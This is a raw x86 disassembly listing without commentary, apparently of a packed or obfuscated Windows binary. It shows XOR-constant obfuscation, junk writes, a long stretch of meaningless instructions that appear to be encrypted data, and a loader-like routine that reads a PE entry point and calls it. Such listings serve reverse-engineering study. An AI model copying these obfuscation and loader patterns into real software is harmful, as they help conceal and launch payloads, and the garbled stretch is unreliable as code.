  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4336b3,0x4336af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433723,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433697,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4336db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433647,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43375f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4336e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433733,0x4336a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43371b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4336af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43371b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4336a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43365f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43365f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43365f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	xor    al,0x4b
  40fae2:	lahf   
  40fae3:	scas   al,BYTE PTR es:[edi]
  40fae4:	cmp    eax,0xae7c7cb3
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fafc
  40faed:	jne    0x40fac1
  40faef:	jmp    0xf4911c84
  40faf4:	leave  
  40faf5:	push   ebp
  40faf6:	(bad)
  40fafa:	fsubr  QWORD PTR [ebp-0x3ef67859]
  40fb00:	pop    ebp
  40fb01:	aad    0x73
  40fb03:	in     eax,dx
  40fb04:	rol    DWORD PTR [edi+eax*1+0x9],cl
  40fb08:	js     0x40fadd
  40fb0a:	sbb    eax,0x80b62e72
  40fb0f:	nop
  40fb10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb11:	sub    eax,0xdfa3ecff
  40fb16:	daa    
  40fb17:	jp     0x40fb8d
  40fb19:	push   eax
  40fb1a:	cmc    
  40fb1b:	pop    edx
  40fb1c:	loop   0x40fb27
  40fb1e:	shl    DWORD PTR [esi+0x4b],1
  40fb21:	ror    DWORD PTR [ebx+0x7c],cl
  40fb24:	xor    BYTE PTR [eax+0x7fd5e714],ah
  40fb2a:	sbb    eax,0xecb3f996
  40fb2f:	jo     0x40fb79
  40fb31:	popf   
  40fb32:	imul   ebx,DWORD PTR ds:0x8da66220,0x7393c6a2
  40fb3c:	out    dx,eax
  40fb3d:	add    ebx,DWORD PTR [edi+0xf]
  40fb40:	inc    edx
  40fb41:	dec    ebp
  40fb42:	adc    eax,0x2784179c
  40fb47:	and    eax,0xab634d84
  40fb4c:	mov    es,WORD PTR [edi+0x22d0766d]
  40fb52:	dec    ebp
  40fb53:	call   0xab0f:0xe2a42b33
  40fb5a:	xchg   ebx,eax
  40fb5b:	and    BYTE PTR [ebx+0x61],ch
  40fb5e:	pop    ecx
  40fb5f:	lds    edi,FWORD PTR [eax]
  40fb61:	mov    bh,BYTE PTR [esi-0x78]
  40fb64:	or     esp,0xf7297383
  40fb6a:	out    dx,eax
  40fb6b:	ins    BYTE PTR es:[edi],dx
  40fb6c:	test   DWORD PTR [ebx+0x75],ebx
  40fb6f:	out    dx,eax
  40fb70:	sahf   
  40fb71:	sub    BYTE PTR [ecx],0x2b
  40fb74:	add    eax,0xf0592402
  40fb79:	xchg   ecx,eax
  40fb7a:	add    BYTE PTR [eax+ecx*1],0x70
  40fb7e:	test   al,0xf1
  40fb80:	pop    ecx
  40fb81:	cs push cs
  40fb83:	mov    esp,0x49a90567
  40fb88:	mov    dl,0x82
  40fb8a:	jp     0x40fb20
  40fb8c:	in     eax,0xe7
  40fb8e:	aam    0xc
  40fb90:	mov    ebp,0x398901ac
  40fb95:	arpl   WORD PTR [edx+0x7ba4766c],di
  40fb9b:	dec    esp
  40fb9c:	and    BYTE PTR [ebx],al
  40fb9e:	jp     0x40fb54
  40fba0:	jns    0x40fbbd
  40fba2:	fst    QWORD PTR [esi+0x73]
  40fba5:	jg     0x40fbd3
  40fba7:	pusha  
  40fba8:	(bad)  
  40fba9:	mov    bl,0xa8
  40fbab:	jl     0x40fc0b
  40fbad:	sbb    DWORD PTR [eax+0x51],esi
  40fbb0:	or     esi,DWORD PTR [eax-0x5f]
  40fbb3:	cmp    eax,0xb154a897
  40fbb8:	xchg   DWORD PTR [esp+esi*2-0x5a],eax
  40fbbc:	mov    al,ds:0x61b23e06
  40fbc1:	outs   dx,DWORD PTR ds:[esi]
  40fbc2:	(bad)  
  40fbc4:	sbb    DWORD PTR [eax],eax
  40fbc6:	fldcw  WORD PTR [ebx-0x6f]
  40fbc9:	repz cmp edx,DWORD PTR [esi]
  40fbcc:	adc    dh,BYTE PTR [edx+edi*8]
  40fbcf:	sbb    eax,DWORD PTR [ebx-0x3be6ceef]
  40fbd5:	imul   esi,esp,0xfb73f969
  40fbdb:	out    dx,al
  40fbdc:	inc    ebp
  40fbdd:	or     DWORD PTR [eax+0x27],ebx
  40fbe0:	test   al,0x66
  40fbe2:	iret   
  40fbe3:	inc    edx
  40fbe4:	repnz clc 
  40fbe6:	(bad)  
  40fbe7:	mov    bl,0x37
  40fbe9:	arpl   WORD PTR [ebx-0x3f],bp
  40fbec:	mov    cl,0x72
  40fbee:	lock and al,0x57
  40fbf1:	rol    dl,0x1a
  40fbf4:	int3   
  40fbf5:	push   eax
  40fbf6:	test   eax,edi
  40fbf8:	test   al,al
  40fbfa:	push   ss
  40fbfb:	mov    eax,0xcacc1d69
  40fc00:	adc    ecx,edx
  40fc02:	dec    esp
  40fc03:	or     eax,0x7000618e
  40fc08:	std    
  40fc09:	mov    dh,0x39
  40fc0b:	pop    ss
  40fc0c:	shl    eax,0xc7
  40fc0f:	add    BYTE PTR [ecx],0xdf
  40fc12:	mov    dl,BYTE PTR [ebx]
  40fc14:	inc    edi
  40fc15:	mov    ah,0x77
  40fc17:	xchg   esi,eax
  40fc18:	inc    ecx
  40fc19:	(bad)  
  40fc1a:	fldpi  
  40fc1c:	xchg   BYTE PTR [eax+eax*4+0x5603b8c4],cl
  40fc23:	in     eax,dx
  40fc24:	leave  
  40fc25:	mov    esp,0x4df2978e
  40fc2a:	mov    BYTE PTR [esi-0x43],ah
  40fc2d:	je     0x40fc7e
  40fc2f:	mov    bl,0x52
  40fc31:	ss stos DWORD PTR es:[edi],eax
  40fc33:	cdq    
  40fc34:	jae    0x40fc6f
  40fc36:	mov    edi,ds
  40fc38:	pusha  
  40fc39:	call   0xa585:0x4d480f98
  40fc40:	fs cmc 
  40fc42:	in     eax,dx
  40fc43:	cs ds jne 0x40fc56
  40fc47:	cld    
  40fc48:	enter  0xc8d1,0x89
  40fc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc4d:	and    DWORD PTR [esi+0x6d],esp
  40fc50:	cmp    BYTE PTR [edx+0x3ad40d4c],0x25
  40fc57:	push   cs
  40fc58:	push   ss
  40fc59:	mov    al,0x22
  40fc5b:	push   0x2c
  40fc5d:	out    0x9a,eax
  40fc5f:	and    BYTE PTR [esi+edi*2],ah
  40fc62:	jecxz  0x40fbef
  40fc64:	out    0x7a,eax
  40fc66:	add    BYTE PTR es:[ecx],dl
  40fc69:	inc    esp
  40fc6a:	xor    eax,0x757af2d7
  40fc6f:	push   es
  40fc70:	nop
  40fc71:	mov    gs,WORD PTR [ecx]
  40fc73:	mov    ah,0x43
  40fc75:	dec    edx
  40fc76:	scas   eax,DWORD PTR es:[edi]
  40fc77:	loopne 0x40fc6f
  40fc79:	repz adc bh,BYTE PTR [eax+0xa425f7b]
  40fc80:	xchg   esp,eax
  40fc81:	cmp    ecx,DWORD PTR ds:0xd2a1aa87
  40fc87:	fnstenv [ebx+edi*1+0x14]
  40fc8b:	enter  0x2a28,0xc1
  40fc8f:	jg     0x40fd08
  40fc91:	cs jmp 0xe04f:0xda6726a0
  40fc99:	inc    ebx
  40fc9a:	leave  
  40fc9b:	je     0x40fc59
  40fc9d:	pusha  
  40fc9e:	dec    eax
  40fc9f:	pushf  
  40fca0:	(bad)  
  40fca1:	(bad)  
  40fca3:	(bad)  
  40fca4:	mov    cl,0x27
  40fca6:	cli    
  40fca7:	dec    eax
  40fca8:	pop    ebx
  40fca9:	scas   eax,DWORD PTR es:[edi]
  40fcaa:	ffreep st(4)
  40fcac:	fcmovnu st,st(4)
  40fcae:	in     al,0xf8
  40fcb0:	pop    DWORD PTR [ebx]
  40fcb2:	cmp    esp,eax
  40fcb4:	add    BYTE PTR [ebx],cl
  40fcb6:	push   eax
  40fcb7:	add    esp,esi
  40fcb9:	out    dx,eax
  40fcba:	push   ecx
  40fcbb:	mov    ecx,0xa9bd49a8
  40fcc0:	inc    edi
  40fcc1:	dec    edx
  40fcc2:	pop    esp
  40fcc3:	adc    esp,ebx
  40fcc5:	ins    BYTE PTR es:[edi],dx
  40fcc6:	gs clc 
  40fcc8:	cmp    BYTE PTR [edx+0x770d45e1],ch
  40fcce:	sbb    cl,BYTE PTR [ecx+0x19c13290]
  40fcd4:	ja     0x40fcca
  40fcd6:	push   gs
  40fcd8:	and    eax,0x4f7574b9
  40fcdd:	or     BYTE PTR [edx],0x5c
  40fce0:	adc    eax,0x252f08c6
  40fce5:	ins    DWORD PTR es:[edi],dx
  40fce6:	mov    al,0x14
  40fce8:	out    0xcd,eax
  40fcea:	test   eax,0xc7c26c20
  40fcef:	jmp    0x8a6bd5dc
  40fcf4:	mov    ah,0x77
  40fcf6:	mov    al,ds:0x53d2627b
  40fcfb:	or     ebp,DWORD PTR [ebp+0x47e25fd3]
  40fd01:	cli    
  40fd02:	sar    BYTE PTR [edi-0x54435484],cl
  40fd08:	icebp  
  40fd09:	into   
  40fd0a:	cwde   
  40fd0b:	jp     0x40fd5b
  40fd0d:	jecxz  0x40fcba
  40fd0f:	mov    ch,0x97
  40fd11:	xchg   ecx,eax
  40fd12:	loope  0x40fd4a
  40fd14:	mov    ds:0x928f6d08,al
  40fd19:	cli    
  40fd1a:	mov    esi,0x35d8aeb0
  40fd1f:	jno    0x40fd0e
  40fd21:	push   edx
  40fd22:	outs   dx,DWORD PTR ds:[esi]
  40fd23:	and    esi,DWORD PTR [edi+edx*8+0x56]
  40fd27:	fisub  DWORD PTR [ecx+0x5b181ee7]
  40fd2d:	mov    DWORD PTR [edx+0x43],eax
  40fd30:	imul   edx,DWORD PTR [ebp-0x9],0x1a82a458
  40fd37:	fcmovnbe st,st(3)
  40fd39:	lea    ebp,[ebp+0x6e5b3d79]
  40fd3f:	inc    ebx
  40fd40:	loop   0x40fcda
  40fd42:	inc    ecx
  40fd43:	in     al,0xdf
  40fd45:	pop    es
  40fd46:	enter  0x41c6,0x34
  40fd4a:	push   0xffffff9c
  40fd4c:	xchg   BYTE PTR [edi+0x6cf9022f],bl
  40fd52:	jo     0x40fd9a
  40fd54:	retf   
  40fd55:	adc    al,0xd5
  40fd57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd58:	fstp   st(3)
  40fd5a:	mov    eax,eax
  40fd5c:	fsub   QWORD PTR [ecx+0x3ec2145b]
  40fd62:	leave  
  40fd63:	in     eax,dx
  40fd64:	xor    eax,0x7af43094
  40fd69:	js     0x40fd09
  40fd6b:	jmp    0x40fd50
  40fd6d:	sub    eax,0xc78cf4da
  40fd72:	adc    dh,BYTE PTR [ebx]
  40fd74:	ret    
  40fd75:	jne    0x40fd70
  40fd77:	les    edi,FWORD PTR [ecx+0x1204815c]
  40fd7d:	iret   
  40fd7e:	hlt    
  40fd7f:	fdivp  st(3),st
  40fd81:	rep lods al,BYTE PTR ds:[esi]
  40fd83:	jl     0x40fd31
  40fd85:	ss enter 0x4808,0x4e
  40fd8a:	out    dx,eax
  40fd8b:	jmp    0xc32df67b
  40fd90:	xchg   esp,eax
  40fd91:	mov    cl,BYTE PTR [edi+ecx*4]
  40fd94:	xor    dh,ch
  40fd96:	mov    eax,0x953bda6a
  40fd9b:	mov    eax,ds:0x88b47d2
  40fda0:	adc    DWORD PTR ds:0x43365f,edx
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdc7:	retf   
  40fdc8:	pop    esp
  40fdc9:	fisubr DWORD PTR [edi-0x43]
  40fdcc:	jl     0x40fe4a
  40fdce:	scas   al,BYTE PTR es:[edi]
  40fdcf:	jle    0x40fe4d
  40fdd1:	jl     0x40fe52
  40fdd3:	cwde   
  40fdd4:	out    dx,eax
  40fdd5:	xchg   ebx,eax
  40fdd6:	lea    esp,[esp+eax*2-0x3]
  40fdda:	pop    es
  40fddb:	rcr    DWORD PTR [eax+0x56],1
  40fdde:	fild   WORD PTR [esi-0x65931430]
  40fde4:	mov    esi,gs
  40fde6:	pop    eax
  40fde7:	pop    es
  40fde8:	adc    eax,0x895b8700
  40fded:	push   edi
  40fdee:	int    0x50
  40fdf0:	adc    edi,DWORD PTR [edx-0x1ab4ddf3]
  40fdf6:	shl    DWORD PTR [esi],1
  40fdf8:	aas    
  40fdf9:	xchg   esp,eax
  40fdfa:	jmp    0x59c6d1b
  40fdff:	pop    esi
  40fe00:	bswap  esi
  40fe02:	and    cl,BYTE PTR [edx+0x7f7c301d]
  40fe08:	dec    edx
  40fe09:	and    ebx,DWORD PTR [esi+0x5d5ca0f5]
  40fe0f:	scas   al,BYTE PTR es:[edi]
  40fe10:	shl    ecx,cl
  40fe12:	mov    cl,0xb7
  40fe14:	or     DWORD PTR [edi],ebp
  40fe16:	jnp    0x40fe58
  40fe18:	rol    BYTE PTR [edx-0x6528171c],cl
  40fe1e:	push   es
  40fe1f:	xchg   esi,eax
  40fe20:	fwait
  40fe21:	dec    edx
  40fe22:	xchg   ecx,eax
  40fe23:	call   DWORD PTR [edi]
  40fe25:	inc    esp
  40fe26:	push   ebx
  40fe27:	je     0x40fe6d
  40fe29:	into   
  40fe2a:	pop    ss
  40fe2b:	push   ebp
  40fe2c:	xchg   ecx,eax
  40fe2d:	pop    ebp
  40fe2e:	adc    eax,0x24fcab62
  40fe33:	or     BYTE PTR [esi+0x4b],0xa5
  40fe37:	cmp    ebp,DWORD PTR [edi+0xf3eeb38]
  40fe3d:	lahf   
  40fe3e:	dec    ebp
  40fe3f:	and    DWORD PTR [esi+0x5b],edx
  40fe42:	push   ss
  40fe43:	pop    edi
  40fe44:	and    ch,BYTE PTR [esi+0x65]
  40fe47:	ret    0xc83e
  40fe4a:	mov    eax,ds:0xc80a2e62
  40fe4f:	aam    0x3a
  40fe51:	xor    ebx,DWORD PTR [eax-0x5aa4dbdf]
  40fe57:	mov    ebp,DWORD PTR fs:[edi]
  40fe5a:	inc    ebx
  40fe5b:	scas   al,BYTE PTR es:[edi]
  40fe5c:	pop    ebp
  40fe5d:	xor    al,0x3
  40fe5f:	pop    ebp
  40fe60:	or     DWORD PTR [eax],ebx
  40fe62:	pop    ds
  40fe63:	cmp    eax,0x1573a4dd
  40fe68:	mov    eax,ds:0xd1e3e401
  40fe6d:	iret   
  40fe6e:	sti    
  40fe6f:	or     eax,0xcfa0aed4
  40fe74:	and    edi,DWORD PTR [ebp-0x19390c2a]
  40fe7a:	in     eax,0xe1
  40fe7c:	pop    ebp
  40fe7d:	or     eax,0x1a3c1429
  40fe82:	dec    ecx
  40fe83:	rcl    edi,0xa4
  40fe86:	lea    ebp,[esi-0x50]
  40fe89:	and    bl,dh
  40fe8b:	mov    ah,0x1a
  40fe8d:	mov    dl,0x9
  40fe8f:	inc    edi
  40fe90:	jle    0x40fe4e
  40fe92:	sub    ch,BYTE PTR [eax+0x7ea7b583]
  40fe98:	inc    ecx
  40fe99:	outs   dx,BYTE PTR ds:[esi]
  40fe9a:	cmp    BYTE PTR [edx-0x13],al
  40fe9d:	outs   dx,DWORD PTR ds:[esi]
  40fe9e:	(bad)  [edi+0x72d6ea67]
  40fea4:	repnz dec ebp
  40fea6:	inc    ebp
  40fea7:	fst    DWORD PTR [esi+0x42]
  40feaa:	sub    al,0xc8
  40feac:	sahf   
  40fead:	loop   0x40fedd
  40feaf:	dec    edx
  40feb0:	int    0x4b
  40feb2:	out    dx,al
  40feb3:	push   ds
  40feb4:	add    esp,esi
  40feb6:	in     eax,0x89
  40feb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb9:	cmp    bl,bl
  40febb:	in     eax,dx
  40febc:	test   eax,0x9732ec93
  40fec1:	pop    esp
  40fec2:	shl    DWORD PTR [esi],1
  40fec4:	cwde   
  40fec5:	mov    ds:0x3f7ffe21,eax
  40feca:	ss fcmovbe st,st(6)
  40fecd:	enter  0xc0a4,0xd1
  40fed1:	mov    eax,ds:0xf81e6bf1
  40fed6:	sahf   
  40fed7:	gs and eax,0x6ace0784
  40fedd:	push   ecx
  40fede:	jo     0x40ff47
  40fee0:	or     ebx,ebx
  40fee2:	in     eax,0xc0
  40fee4:	mov    ecx,0x8a264292
  40fee9:	out    dx,eax
  40feea:	inc    esi
  40feeb:	sbb    BYTE PTR [eax-0x32],bl
  40feee:	in     eax,dx
  40feef:	and    dl,BYTE PTR [ecx-0x387e339e]
  40fef5:	pop    eax
  40fef6:	mov    edx,0x6d5071de
  40fefb:	loopne 0x40ff3d
  40fefd:	jbe    0x40ff49
  40feff:	jle    0x40ff59
  40ff01:	(bad)  
  40ff02:	loopne 0x40ff49
  40ff04:	sub    DWORD PTR [edi+0x5193d8f2],esp
  40ff0a:	mov    esp,0x3b3f5ccc
  40ff0f:	or     BYTE PTR [ebx+ecx*8],cl
  40ff12:	cld    
  40ff13:	mov    dh,0xd0
  40ff15:	push   ebp
  40ff16:	dec    esi
  40ff17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff18:	mov    DWORD PTR [edi-0x5eb986f4],ebp
  40ff1e:	sub    ch,BYTE PTR [ebx]
  40ff20:	xchg   edx,eax
  40ff21:	lods   al,BYTE PTR ds:[esi]
  40ff22:	mov    al,0x85
  40ff24:	(bad)  
  40ff25:	jle    0x40ff30
  40ff27:	sti    
  40ff28:	xlat   BYTE PTR ds:[ebx]
  40ff29:	or     edx,esp
  40ff2b:	sbb    eax,0xd25c6475
  40ff30:	cwde   
  40ff31:	pop    ebx
  40ff32:	or     eax,0x3151f310
  40ff37:	and    dl,dh
  40ff39:	jo     0x40ff48
  40ff3b:	test   BYTE PTR [esi-0x1397afbf],0x8a
  40ff42:	jg     0x40ffb9
  40ff44:	adc    DWORD PTR [ebx],edi
  40ff46:	shl    BYTE PTR [esi],0xf3
  40ff49:	push   esi
  40ff4a:	out    dx,al
  40ff4b:	xchg   BYTE PTR [edi+eax*1+0x44],dl
  40ff4f:	test   al,0x2a
  40ff51:	dec    esi
  40ff52:	push   0x5c
  40ff54:	push   0xffffffb6
  40ff56:	(bad)  ss:[esi-0x68]
  40ff5a:	push   esp
  40ff5b:	hlt    
  40ff5c:	cmp    ebp,DWORD PTR [ecx+0x26143c09]
  40ff62:	cmc    
  40ff63:	cdq    
  40ff64:	shl    ecx,cl
  40ff66:	and    al,0x73
  40ff68:	mov    esp,0x92fdff8f
  40ff6d:	sub    eax,0x65
  40ff70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff71:	mov    eax,ds:0x4c4e16f8
  40ff76:	jp     0x40ff84
  40ff78:	sub    al,0xd7
  40ff7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff7b:	and    esp,DWORD PTR [esi+0x4cca9e0b]
  40ff81:	pop    ecx
  40ff82:	fild   QWORD PTR [ebp+0x25efc758]
  40ff88:	test   DWORD PTR [ecx-0x77],eax
  40ff8b:	lahf   
  40ff8c:	or     DWORD PTR [esi+ebx*4],ecx
  40ff8f:	adc    edx,0xffffffee
  40ff92:	fidiv  WORD PTR [edx]
  40ff94:	and    al,0x77
  40ff96:	repnz loop 0x40ffb8
  40ff99:	push   cs
  40ff9a:	or     al,0xd3
  40ff9c:	(bad)  
  40ff9d:	out    0xb6,eax
  40ff9f:	push   ecx
  40ffa0:	inc    ecx
  40ffa1:	jns    0x40ff76
  40ffa3:	out    0x76,eax
  40ffa5:	sbb    DWORD PTR [esi+0x6a822b81],edx
  40ffab:	rcl    BYTE PTR [edx-0x6551688b],cl
  40ffb1:	(bad)  
  40ffb2:	loop   0x410028
  40ffb4:	xchg   ebp,eax
  40ffb5:	xor    al,0xc4
  40ffb7:	jne    0x40ffdd
  40ffb9:	ds mov ebx,0x134d62a4
  40ffbf:	jbe    0x40ffe4
  40ffc1:	test   eax,0xf69546b
  40ffc6:	pushf  
  40ffc7:	xchg   BYTE PTR [esi+ebp*4+0x68],al
  40ffcb:	lods   al,BYTE PTR ds:[esi]
  40ffcc:	lahf   
  40ffcd:	pop    ss
  40ffce:	adc    ebx,edi
  40ffd0:	(bad)  
  40ffd1:	push   ds
  40ffd2:	adc    DWORD PTR [ecx+eax*8+0x60a27e89],ecx
  40ffd9:	outs   dx,BYTE PTR ds:[esi]
  40ffda:	jge    0x40fff4
  40ffdc:	adc    ebx,DWORD PTR [edi-0x24060e1]
  40ffe2:	inc    esp
  40ffe3:	jle    0x410005
  40ffe5:	add    ah,0x3b
  40ffe8:	xchg   edx,eax
  40ffe9:	or     al,0xeb
  40ffeb:	inc    esp
  40ffec:	gs push 0xfa1e2c5e
  40fff2:	stc    
  40fff3:	xchg   ecx,eax
  40fff4:	int3   
  40fff5:	imul   ebp,DWORD PTR [esi-0x34],0x578d338c
  40fffc:	jo     0x40ffbd
  40fffe:	push   cs
  40ffff:	imul   edx,DWORD PTR [esi-0x70],0xffffffc0
  410003:	(bad)  
  410004:	adc    eax,0x7c4ce41d
  410009:	or     BYTE PTR [eax-0x4c],bh
  41000c:	out    dx,al
  41000d:	xchg   esp,eax
  41000e:	shl    ebp,cl
  410010:	adc    BYTE PTR [ebx+0x56b1743e],0x15
  410017:	icebp  
  410018:	std    
  410019:	cdq    
  41001a:	push   esi
  41001b:	and    DWORD PTR [eax],ebp
  41001d:	out    0xa0,eax
  41001f:	sbb    ebx,ecx
  410021:	out    dx,eax
  410022:	icebp  
  410023:	mov    esi,DWORD PTR [ebp+0x3a256281]
  410029:	mov    dl,0x4
  41002b:	adc    al,0xc
  41002d:	sahf   
  41002e:	adc    DWORD PTR [edi-0x65],ebx
  410031:	jmp    0x6ff7:0x54f6cb0a
  410038:	scas   eax,DWORD PTR es:[edi]
  410039:	push   esp
  41003a:	push   0x1b560560
  41003f:	ret    
  410040:	adc    DWORD PTR [ebx+0x3ab7e1b7],edi
  410046:	stos   BYTE PTR es:[edi],al
  410047:	push   edi
  410048:	pop    ss
  410049:	jmp    0xd6c7:0xef1cacbd
  410050:	sahf   
  410051:	jle    0x4100bb
  410053:	ss gs clc 
  410056:	mov    fs,edi
  410058:	pop    ebp
  410059:	jmp    0xa2f60907
  41005e:	xchg   ebx,eax
  41005f:	ins    BYTE PTR es:[edi],dx
  410060:	jns    0x41005c
  410062:	xor    ecx,ecx
  410064:	sub    bl,bl
  410066:	ret    0xcfa2
  410069:	adc    BYTE PTR [eax],dl
  41006b:	in     al,dx
  41006c:	test   eax,0x9d724806
  410071:	test   ecx,0x19c1cfc8
  410077:	mov    bl,0x24
  410079:	and    eax,0xcce84141
  41007e:	mov    bl,0x63
  410080:	dec    edi
  410081:	push   ss
  410082:	mov    edx,0x10458b54
  410087:	pop    esi
  410088:	test   eax,eax
  41008a:	je     0x4100ae
  410090:	push   DWORD PTR ds:0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4336df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4336df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4336df,eax
  4100dc:	cmp    DWORD PTR ds:0x4336df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4336df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4336df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4336df
  410111:	inc    eax
  410112:	mov    ds:0x4336df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433773
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433657,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4336df,0x4336e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43364f,0x433647
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4336e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433723,0x433757
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433757,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433697
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433723,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433657,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433777
  4101b6:	mov    esi,DWORD PTR ds:0x43378b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433663,0x43369b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433733,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433733
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433733,ecx
  4101f0:	cmp    DWORD PTR ds:0x433733,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433914
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433733,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433763,edi
  410254:	xor    esi,esi
